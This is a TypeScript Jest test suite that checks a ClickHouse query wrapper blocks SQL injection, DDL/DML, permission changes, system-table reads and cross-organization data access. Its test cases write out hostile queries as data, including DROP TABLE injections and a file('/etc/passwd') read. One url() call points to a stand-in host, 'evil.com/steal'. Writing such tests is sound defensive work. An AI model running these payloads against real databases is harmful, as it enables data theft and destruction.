import { describe, it, expect, beforeEach } from "@jest/globals";
import { MockClickhouseWrapper } from "./MockClickhouseWrapper";
import { IClickhouseWrapper } from "./IClickhouseWrapper";

/**
 * Consolidated test suite for ClickHouse wrapper and HQL security
 * Tests both the wrapper functionality and security validations
 */
describe("ClickHouse Wrapper and Security Tests", () => {
  let wrapper: IClickhouseWrapper;
  const testOrgId = "1c6c26f4-d1bd-423c-ba6f-b3375a04fdd0";
  const maliciousOrgId = "99999999-9999-9999-9999-999999999999";

  beforeEach(() => {
    // Create a fresh mock wrapper for each test
    wrapper = new MockClickhouseWrapper();
  });

  describe("Database Operations", () => {
    it("should handle database lifecycle operations", async () => {
      // Test all database operations in one go to avoid repetition
      const operations = [
        wrapper.createTestDatabase(),
        wrapper.createTables(),
        wrapper.insertTestData(),
        wrapper.dropTables(),
        wrapper.dropTestDatabase(),
      ];

      const results = await Promise.all(operations);
      results.forEach(result => {
        expect(result.error).toBeNull();
        expect(result.data).toBeNull();
      });
    });
  });

  describe("Query Execution", () => {
    it("should execute basic SELECT query", async () => {
      const result = await wrapper.dbQuery<any>(
        "SELECT * FROM request_response_rmt",
        []
      );

      expect(result.error).toBeNull();
      expect(result.data).toBeDefined();
      expect(Array.isArray(result.data)).toBe(true);
      expect(result.data?.length).toBeGreaterThan(0);
    });

    it("should execute HQL query with same behavior as regular query", async () => {
      const query = "SELECT * FROM request_response_rmt LIMIT 3";
      const params: any[] = [];

      const regularResult = await wrapper.dbQuery<any>(query, params);
      const hqlResult = await wrapper.dbQueryHql<any>(query, params);

      expect(regularResult.error).toEqual(hqlResult.error);
      expect(regularResult.data).toEqual(hqlResult.data);
    });

    it("should handle empty table queries", async () => {
      const result = await wrapper.dbQuery<any>(
        "SELECT * FROM non_existent_table",
        []
      );

      expect(result.error).toBeNull();
      expect(result.data).toBeDefined();
      expect(result.data?.length).toBe(0);
    });

    it("should extract table names correctly", async () => {
      const queries = [
        "SELECT * FROM request_response_rmt",
        "SELECT * FROM `request_response_rmt`",
        "SELECT * FROM request_response_rmt WHERE id = 1",
        "SELECT * FROM request_response_rmt AS t1",
      ];

      for (const query of queries) {
        const result = await wrapper.dbQuery<any>(query, []);
        expect(result.error).toBeNull();
        expect(result.data).toBeDefined();
        expect(Array.isArray(result.data)).toBe(true);
      }
    });
  });

  describe("SQL Injection Prevention", () => {
    const testCases = [
      {
        name: "multi-statement queries",
        query: `
          SET SQL_helicone_organization_id = '${maliciousOrgId}';
          SELECT * FROM request_response_rmt;
        `,
        errorPattern: /SQL_helicone_organization_id/,
      },
      {
        name: "DROP TABLE attempts",
        query: `
          SELECT * FROM request_response_rmt WHERE user_id = ''; 
          DROP TABLE request_response_rmt; --'
        `,
        errorPattern: /Multi-statement/,
      },
      {
        name: "ALTER TABLE attempts",
        query: `
          SELECT * FROM request_response_rmt;
          ALTER TABLE request_response_rmt ADD COLUMN malicious String;
        `,
        errorPattern: /Multi-statement/,
      },
      {
        name: "INSERT in multi-statement",
        query: `
          SELECT * FROM request_response_rmt;
          INSERT INTO request_response_rmt VALUES ('malicious data');
        `,
        errorPattern: /Multi-statement/,
      },
    ];

    testCases.forEach(({ name, query, errorPattern }) => {
      it(`should block ${name}`, async () => {
        const result = await wrapper.queryWithContext({
          query,
          organizationId: testOrgId,
          parameters: [],
        });

        expect(result.error).toBeTruthy();
        expect(result.data).toBeFalsy();
        if (errorPattern) {
          expect(result.error).toMatch(errorPattern);
        }
      });
    });
  });

  describe("DML Operation Blocking", () => {
    const dmlOperations = [
      { op: "INSERT", query: `INSERT INTO request_response_rmt (organization_id) VALUES ('${maliciousOrgId}')` },
      { op: "UPDATE", query: `UPDATE request_response_rmt SET organization_id = '${maliciousOrgId}'` },
      { op: "DELETE", query: "DELETE FROM request_response_rmt WHERE 1=1" },
    ];

    dmlOperations.forEach(({ op, query }) => {
      it(`should block ${op} statements`, async () => {
        const result = await wrapper.queryWithContext({
          query,
          organizationId: testOrgId,
          parameters: [],
        });

        expect(result.error).toBeTruthy();
        expect(result.data).toBeFalsy();
        expect(result.error).toContain("readonly");
      });
    });

    it("should block inserts via dbInsertClickhouse", async () => {
      const result = await wrapper.dbInsertClickhouse(
        "request_response_rmt",
        [{ response_id: "test-id", organization_id: "test-org" } as any]
      );

      expect(result.error).toBeTruthy();
      expect(result.data).toBeNull();
      expect(result.error).toContain("readonly mode");
    });
  });

  describe("DDL Prevention", () => {
    const ddlOperations = [
      { op: "CREATE TABLE", query: "CREATE TABLE malicious_table (id Int32) ENGINE = Memory" },
      { op: "DROP TABLE", query: "DROP TABLE request_response_rmt" },
      { op: "CREATE VIEW", query: "CREATE VIEW malicious_view AS SELECT * FROM request_response_rmt" },
      { op: "CREATE DATABASE", query: "CREATE DATABASE malicious_db" },
      { op: "DROP DATABASE", query: "DROP DATABASE default" },
      { op: "TRUNCATE TABLE", query: "TRUNCATE TABLE request_response_rmt" },
      { op: "RENAME TABLE", query: "RENAME TABLE request_response_rmt TO hacked_table" },
    ];

    ddlOperations.forEach(({ op, query }) => {
      it(`should block ${op}`, async () => {
        const result = await wrapper.queryWithContext({
          query,
          organizationId: testOrgId,
          parameters: [],
        });

        expect(result.error).toBeTruthy();
        expect(result.data).toBeFalsy();
      });
    });
  });

  describe("System Table Access Prevention", () => {
    const systemTables = [
      "information_schema.tables",
      "system.users",
      "system.grants",
      "system.row_policies",
      "system.tables",
      "system.columns",
    ];

    systemTables.forEach(table => {
      it(`should block access to ${table}`, async () => {
        const result = await wrapper.queryWithContext({
          query: `SELECT * FROM ${table}`,
          organizationId: testOrgId,
          parameters: [],
        });

        expect(result.error).toBeTruthy();
        expect(result.data).toBeFalsy();
      });
    });
  });

  describe("Dangerous Function Blocking", () => {
    const dangerousFunctions = [
      { func: "file", query: "SELECT * FROM file('/etc/passwd', 'CSV')" },
      { func: "url", query: "SELECT * FROM url('http://evil.com/steal', 'CSV')" },
      { func: "odbc", query: "SELECT * FROM odbc('DSN=mydb', 'schema', 'table')" },
      { func: "hdfs", query: "SELECT * FROM hdfs('hdfs://server:9000/path', 'CSV')" },
      { func: "s3", query: "SELECT * FROM s3('https://bucket.s3.amazonaws.com/key', 'CSV')" },
      { func: "input", query: "SELECT * FROM input('user String, age Int32')" },
      { func: "mysql", query: "SELECT * FROM mysql('server:3306', 'db', 'table', 'user', 'pass')" },
      { func: "postgresql", query: "SELECT * FROM postgresql('server:5432', 'db', 'table', 'user', 'pass')" },
    ];

    dangerousFunctions.forEach(({ func, query }) => {
      it(`should block ${func}() function`, async () => {
        const result = await wrapper.queryWithContext({
          query,
          organizationId: testOrgId,
          parameters: [],
        });

        expect(result.error).toBeTruthy();
        expect(result.data).toBeFalsy();
        expect(result.error).toContain("table function");
      });
    });
  });

  describe("Settings and Permission Management", () => {
    it("should block queries with SETTINGS clause", async () => {
      const query = `
        SELECT * FROM request_response_rmt 
        SETTINGS SQL_helicone_organization_id = '${maliciousOrgId}'
      `;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeTruthy();
      expect(result.data).toBeFalsy();
    });

    it("should block queries containing SQL_helicone_organization_id", async () => {
      const result = await wrapper.queryWithContext({
        query: "SELECT * FROM request_response_rmt SETTINGS SQL_helicone_organization_id = 'malicious'",
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeTruthy();
      expect(result.data).toBeNull();
      expect(result.error).toContain("SQL_helicone_organization_id");
    });

    const permissionOps = [
      { op: "GRANT", query: "GRANT SELECT ON *.* TO hql_user" },
      { op: "REVOKE", query: "REVOKE SELECT ON request_response_rmt FROM hql_user" },
      { op: "CREATE USER", query: "CREATE USER hacker IDENTIFIED BY 'password'" },
      { op: "ALTER USER", query: "ALTER USER hql_user IDENTIFIED BY 'newpassword'" },
      { op: "DROP USER", query: "DROP USER IF EXISTS hql_user" },
    ];

    permissionOps.forEach(({ op, query }) => {
      it(`should block ${op} statements`, async () => {
        const result = await wrapper.queryWithContext({
          query,
          organizationId: testOrgId,
          parameters: [],
        });

        expect(result.error).toBeTruthy();
        expect(result.data).toBeFalsy();
      });
    });
  });

  describe("Resource Exhaustion Prevention", () => {
    it("should handle sleep() function", async () => {
      const result = await wrapper.queryWithContext({
        query: "SELECT sleep(60)",
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeTruthy();
      expect(result.data).toBeFalsy();
    });

    it("should prevent excessive memory usage", async () => {
      const query = `
        SELECT * FROM request_response_rmt AS t1
        CROSS JOIN request_response_rmt AS t2
        CROSS JOIN request_response_rmt AS t3
      `;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error || !result.data || result.data.length === 0).toBeTruthy();
    });

    it("should limit result set size", async () => {
      const result = await wrapper.queryWithContext({
        query: "SELECT * FROM request_response_rmt",
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data) {
        expect(result.data.length).toBeLessThanOrEqual(10000);
      }
    });
  });

  describe("Organization Context and Row-Level Security", () => {
    it("should filter data by organization ID", async () => {
      const result = await wrapper.queryWithContext<any>({
        query: "SELECT * FROM request_response_rmt",
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeNull();
      expect(result.data).toBeDefined();
      
      result.data?.forEach((row: any) => {
        if (row.organization_id) {
          expect(row.organization_id).toBe(testOrgId);
        }
      });
    });

    it("should properly filter by organization with DISTINCT", async () => {
      const result = await wrapper.queryWithContext<any>({
        query: "SELECT DISTINCT organization_id FROM request_response_rmt LIMIT 10",
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        result.data.forEach((row: any) => {
          expect(row.organization_id).toBe(testOrgId);
        });
      }
    });

    it("should not return data from other organizations", async () => {
      const result = await wrapper.queryWithContext<any>({
        query: `SELECT * FROM request_response_rmt WHERE organization_id = '${maliciousOrgId}'`,
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeNull();
      expect(result.data).toBeDefined();
      expect(result.data?.length).toBe(0);
    });

    it("should not leak data from other organizations with COUNT", async () => {
      const result = await wrapper.queryWithContext<any>({
        query: `
          SELECT count(*) as cnt FROM request_response_rmt 
          WHERE organization_id != '${testOrgId}'
        `,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        const count = Number((result.data[0] as any).cnt);
        expect(count).toBe(0);
      }
    });

    it("should maintain org filter with WHERE clause", async () => {
      const result = await wrapper.queryWithContext<any>({
        query: `
          SELECT organization_id FROM request_response_rmt 
          WHERE status = 200 
          LIMIT 10
        `,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        result.data.forEach((row: any) => {
          expect(row.organization_id).toBe(testOrgId);
        });
      }
    });

    it("should maintain org filter with GROUP BY", async () => {
      const result = await wrapper.queryWithContext<any>({
        query: `
          SELECT organization_id, COUNT(*) as cnt 
          FROM request_response_rmt 
          GROUP BY organization_id
        `,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        expect(result.data.length).toBeLessThanOrEqual(1);
        if (result.data.length === 1) {
          expect((result.data[0] as any).organization_id).toBe(testOrgId);
        }
      }
    });

    it("should respect LIMIT clause", async () => {
      const limit = 2;
      const result = await wrapper.queryWithContext<any>({
        query: `SELECT * FROM request_response_rmt LIMIT ${limit}`,
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeNull();
      expect(result.data).toBeDefined();
      expect(result.data?.length).toBeLessThanOrEqual(limit);
    });
  });

  describe("Query Parsing Edge Cases", () => {
    it("should handle queries with comments", async () => {
      const query = `
        -- This is a comment
        SELECT * /* inline comment */ FROM request_response_rmt
        -- Another comment
        LIMIT 10
      `;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.error) {
        expect(result.error.toLowerCase()).not.toContain("comment");
      }
    });

    it("should handle queries with newlines and tabs", async () => {
      const query = `SELECT\n\t*\n\tFROM\n\trequest_response_rmt\n\tLIMIT 10`;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.error) {
        expect(result.error.toLowerCase()).not.toContain("syntax");
      }
    });

    it("should handle queries with subqueries", async () => {
      const query = `
        SELECT * FROM (
          SELECT * FROM request_response_rmt 
          WHERE status = 200
        ) AS subquery
        LIMIT 10
      `;

      const result = await wrapper.queryWithContext<any>({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        result.data.forEach((row: any) => {
          if (row.organization_id) {
            expect(row.organization_id).toBe(testOrgId);
          }
        });
      }
    });

    it("should handle CTEs", async () => {
      const query = `
        WITH filtered AS (
          SELECT * FROM request_response_rmt WHERE status = 200
        )
        SELECT * FROM filtered LIMIT 10
      `;

      const result = await wrapper.queryWithContext<any>({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        result.data.forEach((row: any) => {
          if (row.organization_id) {
            expect(row.organization_id).toBe(testOrgId);
          }
        });
      }
    });
  });

  describe("Special Character Injection", () => {
    it("should handle queries with quotes safely", async () => {
      const query = `SELECT * FROM request_response_rmt WHERE user_id = 'user''s_id' LIMIT 1`;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.error) {
        expect(result.error.toLowerCase()).not.toContain("syntax");
      }
    });

    it("should handle backslashes safely", async () => {
      const query = `SELECT * FROM request_response_rmt WHERE user_id = 'test\\malicious' LIMIT 1`;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.error) {
        expect(result.error.toLowerCase()).not.toContain("syntax");
      }
    });

    it("should handle null bytes safely", async () => {
      const query = `SELECT * FROM request_response_rmt WHERE user_id = 'test\x00malicious' LIMIT 1`;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result).toBeDefined();
    });
  });

  describe("Union/Join Attack Prevention", () => {
    it("should prevent UNION-based data leakage from system tables", async () => {
      const query = `
        SELECT organization_id FROM request_response_rmt
        UNION ALL
        SELECT name FROM system.tables
      `;

      const result = await wrapper.queryWithContext({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      expect(result.error).toBeTruthy();
      expect(result.data).toBeFalsy();
    });

    it("should handle self-joins with row-level security", async () => {
      const query = `
        SELECT r1.organization_id 
        FROM request_response_rmt r1
        JOIN request_response_rmt r2 ON r1.request_id = r2.request_id
        LIMIT 10
      `;

      const result = await wrapper.queryWithContext<any>({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        result.data.forEach((row: any) => {
          expect(row.organization_id).toBe(testOrgId);
        });
      }
    });

    it("should handle LEFT JOIN with row-level security", async () => {
      const query = `
        SELECT r1.organization_id 
        FROM request_response_rmt r1
        LEFT JOIN request_response_rmt r2 ON r1.request_id = r2.request_id
        LIMIT 10
      `;

      const result = await wrapper.queryWithContext<any>({
        query,
        organizationId: testOrgId,
        parameters: [],
      });

      if (result.data && result.data.length > 0) {
        result.data.forEach((row: any) => {
          if (row.organization_id) {
            expect(row.organization_id).toBe(testOrgId);
          }
        });
      }
    });
  });

  describe("Data Integrity", () => {
    it("should return consistent mock data", async () => {
      const result1 = await wrapper.dbQuery<any>(
        "SELECT * FROM request_response_rmt",
        []
      );
      
      const result2 = await wrapper.dbQuery<any>(
        "SELECT * FROM request_response_rmt",
        []
      );

      expect(result1.data).toEqual(result2.data);
    });
  });
});